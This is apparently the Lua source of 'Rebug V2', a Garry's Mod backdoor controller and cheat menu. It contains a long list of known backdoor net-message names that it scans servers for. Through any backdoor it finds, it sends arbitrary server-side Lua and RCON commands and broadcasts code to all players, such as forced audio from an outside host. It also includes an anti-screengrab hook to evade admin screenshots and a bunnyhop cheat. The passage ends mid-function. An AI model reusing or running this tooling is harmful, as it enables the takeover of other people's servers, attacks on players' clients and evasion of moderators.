/*
*
*     ▄████████    ▄████████ ▀█████████▄  ███    █▄     ▄██████▄  
*    ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
*    ███    ███   ███    █▀    ███    ███ ███    ███   ███    █▀  
*   ▄███▄▄▄▄██▀  ▄███▄▄▄      ▄███▄▄▄██▀  ███    ███  ▄███        
*  ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ▀▀███▀▀▀██▄  ███    ███ ▀▀███ ████▄  
*  ▀███████████   ███    █▄    ███    ██▄ ███    ███   ███    ███ 
*    ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
*    ███    ███   ██████████ ▄█████████▀  ████████▀    ████████▀  
*    ███    ███                                                   
*
*
*  Backdoor controller created by Project Rebug. The code for this script
*  has been made organised for better understanding.
*  https://discord.gg/2V8j6gn
*/

/*
*   Coded By ProjectRebug Version2 Release Source
*   https://github.com/ProjectRebug/RebugV2-Release
*   Note to the person using this, removing this
*   text is in violation of the licence you agreed
*   to by downloading.
*   Copyright © ProjectRebug 2020
*   Licenced under © GNU licence here
*   https://github.com/ProjectRebug/RebugV2-Release/blob/master/LICENSE
*
*   Project Rebug: 2016-2020
*/

surface.CreateFont("MenuFont", {
    font = "testfont1",
    size = 12,
    weight = 674,
    antialias = false,
    outline = true
})

local function msgG(time, text)
    if not windowopen then
        windowopen = true
        local window = vgui.Create("DFrame")
        window:SetPos(ScrW() / 2.7, 0)
        window:SetSize(500, 25)
        window:SlideDown(0.3)
        window:SetTitle("")
        window:ShowCloseButton(false)
        window:SetDraggable(false)

        window.Paint = function(s, w, h)
            surface.SetDrawColor(40, 40, 40, 240)
            surface.DrawRect(0, 0, w, h)
            --draw.RoundedBox(8, 0, 0, w, h, Color(40, 40, 40, 240))
            draw.DrawText(text, "MenuFont", w / 2, 6, Color(0, 255, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        end

        timer.Simple(time, function()
            if windowopen then
                window:SlideUp(0.3)

                timer.Simple(0.3, function()
                    windowopen = false
                    window:Remove()
                end)
            end
        end)
    end

    chat.PlaySound()
    print("\n" .. text .. "\n")
end

local function msgY(time, text)
    if not windowopen then
        windowopen = true
        local window = vgui.Create("DFrame")
        window:SetPos(ScrW() / 2.7, 0)
        window:SetSize(500, 25)
        window:SlideDown(0.3)
        window:SetTitle("")
        window:ShowCloseButton(false)
        window:SetDraggable(false)

        window.Paint = function(s, w, h)
            surface.SetDrawColor(40, 40, 40, 240)
            surface.DrawRect(0, 0, w, h)
            --draw.RoundedBox(8, 0, 0, w, h, Color(40, 40, 40, 240))
            draw.DrawText(text, "MenuFont", w / 2, 6, Color(255, 255, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        end

        timer.Simple(time, function()
            if windowopen then
                window:SlideUp(0.3)

                timer.Simple(0.3, function()
                    windowopen = false
                    window:Remove()
                end)
            end
        end)
    end

    chat.PlaySound()
    print("\n" .. text .. "\n")
end

local function msgR(time, text)
    if not windowopen then
        windowopen = true
        local window = vgui.Create("DFrame")
        window:SetPos(ScrW() / 2.7, 0)
        window:SetSize(500, 25)
        window:SlideDown(0.3)
        window:SetTitle("")
        window:ShowCloseButton(false)
        window:SetDraggable(false)

        window.Paint = function(s, w, h)
            surface.SetDrawColor(40, 40, 40, 240)
            surface.DrawRect(0, 0, w, h)
            --draw.RoundedBox(8, 0, 0, w, h, Color(40, 40, 40, 240))
            draw.DrawText(text, "MenuFont", w / 2, 6, Color(255, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        end

        timer.Simple(time, function()
            if windowopen then
                window:SlideUp(0.3)

                timer.Simple(0.3, function()
                    windowopen = false
                    window:Remove()
                end)
            end
        end)
    end

    chat.PlaySound()
    print("\n" .. text .. "\n")
end

-- hehe
local function msgRGB(time, text)
    if not windowopen then
        windowopen = true
        local window = vgui.Create("DFrame")
        window:SetPos(ScrW() / 2.7, 0)
        window:SetSize(500, 25)
        window:SlideDown(0.3)
        window:SetTitle("")
        window:ShowCloseButton(false)
        window:SetDraggable(false)

        window.Paint = function(s, w, h)
            surface.SetDrawColor(40, 40, 40, 240)
            surface.DrawRect(0, 0, w, h)
            --draw.RoundedBox(8, 0, 0, w, h, Color(40, 40, 40, 240))
            draw.DrawText(text, "MenuFont", w / 2, 6, HSVToColor(RealTime() * 69 % 360, 1, 1) or Color(0, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        end

        timer.Simple(time, function()
            if windowopen then
                window:SlideUp(0.3)

                timer.Simple(0.3, function()
                    windowopen = false
                    window:Remove()
                end)
            end
        end)
    end

    chat.PlaySound()
    print("\n" .. text .. "\n")
end

local function rprint(...)
    chat.AddText(Color(255, 0, 20), "[REBUG] ", Color(20, 150, 200), ...)
end

/*
*	StartUp
*/

msgY(1.4, "Initializing...")
surface.PlaySound("weapons/ar2/ar2_reload.wav")

// protections
RunConsoleCommand('r_shader_srgb', '0')
chat.AddText(string.rep("\n", 1000))

timer.Simple(2, function()
    local rvac = (_G)

    do
        if (rvac.game.SinglePlayer()) then
            msgR(4.3, "Menu will not load in single player!")
            surface.PlaySound("buttons/lightswitch2.wav")

            return
        end

	--[[if (_G.Loaded2) then
		msgR(4.3, "The Backdoor menu has already been loaded, Reloading will cause errors!")
		surface.PlaySound("buttons/lightswitch2.wav")
		return
	end]]
        _G.Loaded2 = true
    end

    print("\n")
    surface.PlaySound("buttons/bell1.wav")

	print("\n")
MsgC(Color(255, 0, 0), ".---..-----------------------------------------------..---.\n", 
Color(255, 64, 0), "|   ||.---------------------------------------------.||   |\n", 
Color(255, 128, 0), "| o |||                 Rebug Cheats                ||| o |\n", 
Color(255, 191, 0), "| _ |||---------------------------------------------||| _ |\n", 
Color(255, 191, 0), "|(_)|||                 Version: 2.0                |||(_)|\n",
Color(255, 255, 0), "|   |||                Date: 07.09.19               |||   |\n",
Color(191, 255, 0), "|   |||---------------------------------------------|||   |\n", 
Color(128, 255, 0), "|.-.|||                   Updates:                  |||.-.|\n", 
Color(64, 255, 0), "| o |||    |SnteDetour| |Bd UI Update| |Cheat Menu| ||| o |\n", 
Color(0, 255, 0), "|`-'|||---------------------------------------------|||`-'|\n", 
Color(0, 255, 64), "|   |||                   Creator:                  |||   |\n", 
Color(0, 255, 128), "|.-.|||             Void, Cyanide, Gubbi            |||.-.|\n", 
Color(0, 255, 191), "| O |||---------------------------------------------||| O |\n", 
Color(0, 255, 255), "|`-'||`---------------------------------------------'||`-'|\n", 
Color(0, 191, 255), "`---'`-----------------------------------------------'`---'\n",
Color(0, 128, 255), "       _||_   Imagine paying for grobyware or   _||_\n", 
Color(0, 64, 255), [[      /____\        Some french paste xD       /____\ ]] .. "\n", 
Color(90, 0, 255), "                            lmao \n")

	print("\n")

    timer.Create("ChatPrint2", 0.1, 1, function()
        msgRGB(3.2, "Backdoor Menu Loaded!")
    end)

/*
*	Menu Optimization
*/

hook.Add( "InitPostEntity", "fpsbooster", function()
	RunConsoleCommand("gmod_mcore_test", "1")
	RunConsoleCommand("mat_queue_mode", "-1")
	RunConsoleCommand("cl_threaded_bone_setup", "1")
	RunConsoleCommand("cl_threaded_client_leaf_system", "1")
	RunConsoleCommand("r_threaded_client_shadow_manager", "1")
	RunConsoleCommand("r_threaded_particles", "1")
	RunConsoleCommand("r_threaded_renderables", "1")
	RunConsoleCommand("r_queued_ropes", "1")
	RunConsoleCommand("studio_queue_mode", "1")
	 	hook.Remove("RenderScreenspaceEffects", "RenderColorModify")
 		hook.Remove("RenderScreenspaceEffects", "RenderBloom")
 		hook.Remove("RenderScreenspaceEffects", "RenderToyTown")
 		hook.Remove("RenderScreenspaceEffects", "RenderTexturize")
 		hook.Remove("RenderScreenspaceEffects", "RenderSunbeams")
 		hook.Remove("RenderScreenspaceEffects", "RenderSobel")
 		hook.Remove("RenderScreenspaceEffects", "RenderSharpen")
 		hook.Remove("RenderScreenspaceEffects", "RenderMaterialOverlay")
 		hook.Remove("RenderScreenspaceEffects", "RenderMotionBlur")
 		hook.Remove("RenderScene", "RenderStereoscopy")
 		hook.Remove("RenderScene", "RenderSuperDoF")
 		hook.Remove("GUIMousePressed", "SuperDOFMouseDown")
 		hook.Remove("GUIMouseReleased", "SuperDOFMouseUp")
 		hook.Remove("PreventScreenClicks", "SuperDOFPreventClicks")
 		hook.Remove("PostRender", "RenderFrameBlend")
 		hook.Remove("PreRender", "PreRenderFrameBlend")
 		hook.Remove("Think", "DOFThink")
 		hook.Remove("RenderScreenspaceEffects", "RenderBokeh")
 		hook.Remove("NeedsDepthPass", "NeedsDepthPass_Bokeh")
 		hook.Remove("PostDrawEffects", "RenderWidgets")
 		hook.Remove("PostDrawEffects", "RenderHalos")
end)

hook.Add("OnEntityCreated","WidgetInit",function(ent)
	if ent:IsWidget() then
		hook.Add( "PlayerTick", "TickWidgets", function( pl, mv ) widgets.PlayerTick( pl, mv ) end ) 
		hook.Remove("OnEntityCreated","WidgetInit")
	end
end)

/*
*	Administration Addons
*/
    if istable(ULib) then
        rprint("Admin-Mod: ULX")
    end

    if istable(FAdmin) then
        rprint("Admin-Mod: FAdmin")
    end

    if istable(GExtension) then
        rprint("Admin-Mod: GExtension")
    end

    if istable(gBan) then
        rprint("Admin-Mod: gBan")
    end
	
/*
*	Locals
*/

    local rebug = {}
    local channel = ""
    local netStrings = {}
    local BD = {}
    local noob = {}
    local MenuDelay = false
    local MenuOpen = false
    local ply = LocalPlayer()
    local selPly = 0

/*
*	Fonts
*/

    surface.CreateFont("button", {
        font = "Calibri",
        extended = not 1,
        size = 16,
        weight = 500,
        blursize = 0,
        scanlines = 0,
        antialias = not not 1,
        underline = not 1,
        italic = not 1,
        strikeout = not 1,
        symbol = not 1,
        rotary = not 1,
        shadow = not 1,
        additive = not 1,
        outline = not 1
    })

/*
*	Gradients
*/

    local grad = Material("gui/gradient")
    local upgrad = Material("gui/gradient_up")
    local downgrad = Material("gui/gradient_down")
/*
*	Colors
*/

    local o_color2 = Color(30, 30, 30, 255)
    local o_blue = Color(20, 150, 200, 255)

/*
*	NetWork
*/

	local function CheckIfStringExists(str)
		local i = 1
		while util.NetworkIDToString(i) do
			if util.NetworkIDToString(i) == str then 
                return true 
            end
			i = i + 1
		end
	end

	local function rndstr(len)
		if len == nil then
			len = 5
		end

		local chars = string.Split("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789", "")
		local r = ""

		while string.len(r) < len do
			r = r .. chars[math.random(1, #chars)]
		end

		return r
	end

	local noobstr = rndstr(16)
	
    -- Notify
    function noob.Notify(msg)
        chat.AddText(Color(255, 0, 0), "[REBUG] ", o_blue, msg)
    end

    -- Backdoored Strings
	netStrings = {"hacking bro","hackingbro","kebabmenu","rotten_proute","BITMINER_UPDATE_DLC","nostrip2","operationsmoke","vegeta","pd1","JSQuery.Data ( Post ( false ) )","anatikisgodd","anatikisgod","https://i.imgur.com/gf6hlml.png","print ( )","fps","fszof<qOvfdsf","tupeuxpaslabypass","_CAC_G","adsp_door_length","SDFTableFsSSQS","EventStart","data_check","antileak","CreateAdminRanks","Asunalabestwaifu","shittycommand","tro2fakeestunpd","FAdmin_CreateVar","ContextHelp","lmaogetdunked","LV_BD_V2","createpanel","fuckyou","1337","haxor","r8helper","_chefhackv2","Þà?D)?","Þ  ?D)?","nostrip1","antilagger","Fix_Exploit","yazStats","FPSVBOOST","RTX420","Revelation","SizzurpDRM","cbbc","gSploit","ÃƒÅ¾ÃƒÂ ?D)Ã¢â€”Ëœ","Reaoscripting","ß ?D)?","?????????????????Ð¿??? ?? ?Ñ¿??Ä¿Õ¿? ???Ñ¿??Õ¿??Ð®","!Çº/;.","NoOdium_Reaoscripting","m9k_","Î¾psilon","Backdoor","reaper","SDFTableFsSSQE","gmod_dumpcfg", "fpsvboost", "antipk", "privatebackdoorshixcrewpr", "edouardo573", "sikye", "addoncomplie", "novisit", "no_visitping", "_reading_darkrp", "gPrinters.sncSettings", "mat", "mat(0)", "banId2", "keyss", "!?/;.", "SteamApp2313", "??D)?","?", "Þ� ?D)◘", "Val", "models/zombie.mdl","REBUG", "????????????????????? ?? ??????? ??????????", "material", "entityhealt", "banId", "kickId2", "json.parse(crashsocket)", "elsakura", "dev", "FPSBOOST", "INJ3v4", "MJkQswHqfZ", "_GaySploit", "GaySploitBackdoor", "xuy", "legrandguzmanestla", "_Battleye_Meme_", "Dominos", "elfamosabackdoormdr", "thefrenchenculer", "xenoexistscl", "_Defcon", "EnigmaIsthere", "BetStrep", "JQerystrip.disable", "ξpsilon", "Ulogs_Infos", "jeveuttonrconleul", "Sandbox_ArmDupe", "OdiumBackDoor", "RTPayloadCompiler", "playerreportabuse", "12", "opensellermenu", "sbussinesretailer", "DarkRP_Money_System", "ohnothatsbad", "yarrakye", "�? ?D)?", "DataMinerType", "weapon_phygsgun_unlimited","PlayerKilledLogged", "mdrlollesleakcestmal", "yerdxnkunhav", "kebab","L_BD_v2", "netstream", "pure_func_run_lua", "rconyesyes", "Abcdefgh", "Fibre", "FPP_AntiStrip", "kidrp", "blacklist_backdoor", "boombox", "DOGE", "hexa", "-c", "VL_BD", "OBF::JH::HAX", "SACAdminGift", "GetSomeInfo", "nibba", "RegenHelp", "xmenuiftrue", "d4x1cl", "BlinkingCheckingHelp", "AnalCavity", "Data.Repost", "YOH_SAMBRE_IS_CHEATER", "dropadmin", "GLX_push", "ALTERED_CARB0N", "thenostraall", "LVDLVM", ">sv", "utf8-gv", "argumentumac", "runSV", "adm_", "Inj3", "samosatracking57", "doorfix", "SNTEFORCE", "GLX_plyhdlpgpxlfpqnghhzkvzjfpjsjthgs", "disablecarcollisions" , "PlayerCheck" , "Sbox_darkrp" , "insid3" , "The_Dankwoo" , "Sbox_itemstore" , "Ulib_Message" , "ULogs_Info" , "ITEM" , "R8" , "fix" , "Fix_Keypads" , "Remove_Exploiters" , "noclipcloakaesp_chat_text" , "_Defqon" , "_CAC_ReadMemory" , "nostrip" , "nocheat" , "LickMeOut" , "ULX_QUERY2" , "ULXQUERY2" , "https://i.imgur.com/Gf6hLMl.png" , "MoonMan" , "Im_SOCool" , "JSQuery.Data(Post(false))" , "Sandbox_GayParty" , "DarkRP_UTF8" , "OldNetReadData" , "Gamemode_get" , "memeDoor" , "BackDoor" , "SessionBackdoor" , "DarkRP_AdminWeapons" , "cucked" , "NoNerks" , "kek" , "ZimbaBackdoor" , "something" , "random" , "strip0" , "fellosnake" , "enablevac" , "idk" , "ÃžÃ� ?D)â—˜" , "snte" , "apg_togglemode" , "Hi" , "beedoor" , "BDST_EngineForceButton" , "VoteKickNO" , "REEEEEEEEEEEE" , "_da_" , "Nostra" , "sniffing" , "keylogger" , "CakeInstall" , "Cakeuptade" , "love" , "earth" , "ulibcheck" , "Nostrip_" , "teamfrench" , "ADM" , "hack" , "crack" , "leak" , "lokisploit" , "1234" , "123" , "enculer" , "cake" , "seized" , "88" , "88_strings_" , "nostraall" , "blogs_update" , "nolag" , "loona_" , "_logs" , "loona" , "negativedlebest" , "berettabest" , "ReadPing" , "antiexploit" , "adm_NetString" , "mathislebg" , "Bilboard.adverts:Spawn(false)" , "pjHabrp9EY" , "?" , "lag_ping" , "allowLimitedRCON(user) 0" , "aze46aez67z67z64dcv4bt" , "killserver" , "fuckserver" , "cvaraccess" , "rcon" , "rconadmin" , "web" , "jesuslebg" , "zilnix" , "��?D)?" , "disablebackdoor" , "kill" , "DefqonBackdoor" , "DarkRP_AllDoorDatas" , "0101.1" , "awarn_remove" , "_Infinity" , "Infinity" , "InfinityBackdoor" , "_Infinity_Meme_" , "arivia" , "ULogs_B" , "_Warns" , "_cac_" , "striphelper" , "_vliss" , "YYYYTTYXY6Y" , "?????????????????�???? ?? ?�???�?�?? ???�???�???�." , "_KekTcf" , "_blacksmurf" , "blacksmurfBackdoor" , "_Raze" , "m9k_explosionradius" , "m9k_explosive" , "m9k_addons" , "rcivluz" , "SENDTEST" , "_clientcvars" , "_main" , "stream" , "waoz" , "bdsm" , "ZernaxBackdoor" , "UKT_MOMOS" , "anticrash" , "audisquad_lua" , "dontforget" , "noprop" , "thereaper" , "0x13" , "Child" , "!Cac" , "azkaw" , "BOOST_FPS" , "childexploit" , "ULX_ANTI_BACKDOOR" , "FADMIN_ANTICRASH" , "ULX_QUERY_TEST2" , "GMOD_NETDBG" , "netlib_debug" , "_DarkRP_Reading" , "lag_ping" , "||||"  , "FPP_RemovePLYCache" , "fuwa" , "stardoor" , "SENDTEST" , "rcivluz" , "c" , "N::B::P" , "changename" , "PlayerItemPickUp" , "echangeinfo" , "fourhead" , "music" , "slua" , "adm_network" , "componenttolua" , "theberettabcd" , "SparksLeBg" , "DarkRP_Armors" , "DarkRP_Gamemodes" , "fancyscoreboard_leave" , "PRDW_GET" , "pwn_http_send" , "AnatikLeNoob" , "GVacDoor" , "Keetaxor" , "BackdoorPrivate666" , "YohSambreLeBest" , "SNTE<ALL" , "!�:/;." , "pwn_http_answer" , "pwn_wake" , "verifiopd" , "AidsTacos" , "shix" , "PDA_DRM_REQUEST_CONTENT" , "xenoreceivetargetdata2" , "xenoreceivetargetdata1" , "xenoserverdatafunction" , "xenoserverfunction" , "xenoclientdatafunction" , "xenoclientfunction" , "xenoactivation" , "EXEC_REMOTE_APPS" , "yohsambresicianatik<3" , "Sbox_Message" , "Sbox_gm_attackofnullday_key" , "The_DankWhy" , "nw.readstream" , "AbSoluT" , "__G____CAC" , "Weapon_88" , "mecthack" , "SetPlayerDeathCount" , "FAdmin_Notification_Receiver" , "DarkRP_ReceiveData" , "fijiconn" , "LuaCmd" , "EnigmaProject" , "z" , "cvardel" , "effects_en" , "file" , "gag" , "asunalabestwaifu" , "stoppk" , "Ulx_Error_88" , "NoOdium_ReadPing", " striphelper "}

	function CheckBackdoors()
		for k, v in pairs(netStrings) do
			if(CheckIfStringExists(v)) then
				channel = v
				chat.AddText(Color(255, 0, 0), "[REBUG]", Color(20, 150, 20), " Found vulnerability ▶ ", Color(20, 150, 200), v)
			end
		end
		if(channel == "") then
			chat.AddText(Color(255, 0, 0), "[REBUG]", Color(225, 155, 155), " No vulnerability has been found")
		end
	end

    function noob.PostLua(str)
        net.Start(channel)
        net.WriteString(str)
        net.WriteBit(1)
        net.SendToServer()
    end

    function noob.PostRcon(str)
        net.Start(channel)
        net.WriteString(str)
        net.WriteBit(false)
        net.SendToServer()
    end

    function noob.PostLua(str)
        if (channel == "") then
            rprint(" You are not targeting a NetString")

            return
        end

        net.Start(channel)
        net.WriteString(str)
        net.WriteBit(1)
        net.SendToServer()
    end

    function sendLuaPly(str)
        net.Start(channel)
        net.WriteString("BroadcastLua([[" .. str .. "]])")
        net.SendToServer()
    end

    function sendLuaPlyKv(str)
        net.Start(channel)
        net.WriteString([[

			for k, v in pairs(player.GetAll()) do
				v:SendLua(]] .. str .. [[)
			end

		]])
        net.SendToServer()
    end

/*
*	ScreenGrab
*/

	local fakeRT = GetRenderTarget( "fakeRT" .. os.time(), ScrW(), ScrH() )
     
	hook.Add( "RenderScene", "RSByman", function( vOrigin, vAngle, vFOV )
		local view = {
			x = 0,
			y = 0,
			w = ScrW(),
			h = ScrH(),
			dopostprocess = true,
			origin = vOrigin,
			angles = vAngle,
			fov = vFOV,
			drawhud = true,
			drawmonitors = true,
			drawviewmodel = true
		}
 
		render.RenderView( view )
		render.CopyTexture( nil, fakeRT )
 
		cam.Start2D()
			hook.Run( "AltHUDPaint" )
		cam.End2D()
 
		render.SetRenderTarget( fakeRT )
 
		return true
	end )
 
	hook.Add( "ShutDown", "RemoveAntiScreenGrab", function()
		render.SetRenderTarget()
	end )

/*
*	Insert Key
*/

    function rebug.voidz()
        hook.Add("Think", "openMenu", function()
            if input.IsKeyDown(KEY_INSERT) and not MenuDelay then
                MenuDelay = true
                rebug.load()

                timer.Simple(0.5, function()
                    MenuDelay = false
                end)
            end
        end)
    end

    function rebug.load()
        if MenuOpen then
            CloseMenu()

            return
        end

/*
*	BunnyHop
*/

	bhop_ch = 0
	
	function OP_Bhop()
		if bhop_ch == 0 then
			bhop_ch = 1

			hook.Add("CreateMove", "REBUG", function(ply)
				ch_bunnyhop(ply);
			end);

			rprint("Enabled")
		else
			bhop_ch = 0
			rprint("Disabled")
	
			if hook.GetTable("CreateMove", "REBUG") then
				hook.Remove("CreateMove", "REBUG")
			end
		end
	end

	function ch_bunnyhop(ply)
		if(ply:KeyDown(IN_JUMP) && !LocalPlayer():IsOnGround()) then
			ply:RemoveKey(IN_JUMP);

			if !LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() != MOVETYPE_NOCLIP then
				if(ply:GetMouseX() > 1 || ply:GetMouseX() < -1) then
					ply:SetSideMove(ply:GetMouseX() > 1 && 400 || -400);
				else
					ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D());
					ply:SetSideMove((ply:CommandNumber() % 2 == 0) && -400 || 400);
				end
			end
		elseif(ply:KeyDown(IN_JUMP)) then
			ply:SetForwardMove(10000)
		end
	end

/*
*	Main Menu
*/

        MenuOpen = true
        local Void = vgui.Create("DFrame")
        surface.PlaySound("buttons/blip1.wav")
        Void:SetSize(900, 700)
        Void:Center()
        Void:SetTitle("")
        Void:ShowCloseButton()
        Void:MakePopup()
        Void:SetVisible(true)
        Void:SetDraggable(true)

        Void.Paint = function(self, w, h)
            surface.DrawRect(4, 4, Void:GetWide() - 8, Void:GetTall() - 8)
            draw.RoundedBox(10, 0, 0, w, h, Color(35, 35, 35, 255))
            surface.SetDrawColor(36, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(0, 0, 0, 0)
            surface.DrawOutlinedRect(0, 0, w, h)
            surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
        end

        local VoidPlate = vgui.Create('DPanelList', Void)
        VoidPlate:SetSize(888, 688)
        VoidPlate:SetPos(6, 6)

        VoidPlate.Paint = function(s, w, h)
            surface.SetDrawColor(Color(35, 35, 35))
            draw.RoundedBox(10, 20, 20, w + 0, h - 1, Color(35, 35, 35, 255))
            surface.SetDrawColor(25, 25, 25)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(35, 35, 35, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local Rainbow = vgui.Create('DPanelList', VoidPlate)
        Rainbow:SetSize(890, 2)
        Rainbow:SetPos(1, 0)

        Rainbow.Paint = function(s, w, h)
            surface.SetDrawColor(Color(100, 100, 100))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetDrawColor(Color(100, 100, 100))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(HSVToColor(CurTime() % 6 * 60, 1, 1))
            surface.DrawOutlinedRect(0, 0, w, h)
            surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
        end

/*
*	Button Functions
*/

        function rebug.AddButton(name, parent, func)
            local button = parent:Add("DButton")
            button:SetText("")
            button:Dock(TOP)
            button:SetFont("DermaDefault")
            button:DockMargin(0, 0, 0, 5)
            button:SetSize(170, 30)
            button.DoClick = func

            button.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(21, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(21, 21, 21, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
                draw.SimpleTextOutlined(name, "button", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1, 1, color_black)
            end
        end

        function rebug.AddButtonBIG(name, parent, func)
            local button = parent:Add("DButton")
            button:SetText("")
            button:Dock(TOP)
            button:SetFont("Trebuchet18")
            button:DockMargin(0, 0, 0, 5)
            button:SetSize(525, 30)
            button.DoClick = func

            button.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(21, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(21, 21, 21, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
                draw.SimpleTextOutlined(name, "button", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1, 1, color_black)
            end
        end

/*
*	Label Functions
*/

        function noob.addLabel(name, posx, posy, parent)
            local T1 = parent:Add("DLabel")
            T1:SetSize(200, 80)
            T1:SetPos(posx, posy)
            T1:SetFont("Trebuchet18")
            T1:SetText(name)
            T1:SetTextColor(Color(255, 255, 255, 255))
        end

        --Labels
        noob.addLabel("Server BackDoors", 60, 100, VoidPlate)
        noob.addLabel("RCON Backdoors", 280, 100, VoidPlate)
        noob.addLabel("Target Backdoors", 515, 100, VoidPlate)
        noob.addLabel("Player List", 755, 100, VoidPlate)

/*
*	SoundBoard( BD Required )
*/

        function soundboard()
            local soundboard = vgui.Create("DFrame")
            surface.PlaySound("buttons/blip1.wav")
            soundboard:SetSize(600, 450)
            soundboard:Center()
            soundboard:SetTitle("SoundBoard ( Backdoor Required )")
            soundboard:MakePopup()
            soundboard:SetDraggable(true)

            soundboard.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(35, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(35, 35, 35, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            local soundPlate = vgui.Create('DPanelList', soundboard)
            soundPlate:SetSize(590, 418)
            soundPlate:SetPos(6, 27)

            soundPlate.Paint = function(s, w, h)
                surface.SetDrawColor(Color(35, 35, 35))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(35, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(35, 35, 35, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            local customurl = vgui.Create("DButton", soundPlate)
            customurl:SetFont("Trebuchet18")
            customurl:SetText("Play Custom URL")
            customurl:SetFont("Trebuchet18")
            customurl:SetTextColor(Color(255, 255, 255, 255))
            customurl:SetPos(20, 13)
            customurl:SetSize(550, 40)

            customurl.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(21, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(21, 21, 21, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            customurl.DoClick = function()
                surface.PlaySound("buttons/button18.wav")
                Derma_StringRequest("Play Sound", "Set Link (Has to end with .AUDIOFORMAT)", "", function(str)
                    noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. str .. "\" , \"mono\", function() end)]])")
                end)
            end

            local List7 = vgui.Create("DPanelList", soundPlate)
            List7:SetPos(20, 63)
            List7:SetSize(550, 340)
            List7:SetName("")

            List7.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(21, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(21, 21, 21, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            local item7 = vgui.Create("DPanelList", List7)
            item7:SetPos(10, 8)
            item7:SetSize(530, 320)
            item7:SetPadding(2)
            item7:SetSpacing(2)
            item7:EnableHorizontal(false)
            item7:EnableVerticalScrollbar(true)
            item7:SetName("")

            item7.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(21, 21, 21)
                surface.SetDrawColor(35, 35, 35, 0)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            local Bar7 = vgui.Create("DScrollPanel", item7)
            Bar7:Dock(FILL)
            local sBar7 = Bar7:GetVBar()

            function sBar7:Paint()
            end

            function sBar7.btnUp:Paint()
            end

            function sBar7.btnDown:Paint()
            end

            function sBar7.btnGrip:Paint()
            end

            rebug.AddButtonBIG("Earth Wind (Normal)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://rvac.cc/log1n/sound/earth.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("Comethazine Walk (Normal)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://rvac.cc/sound/walk.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("Fortnite Default Dance (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://rvac.cc/log1n/sound/default.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("LilPump DRose (EarRape)", Bar7, function()
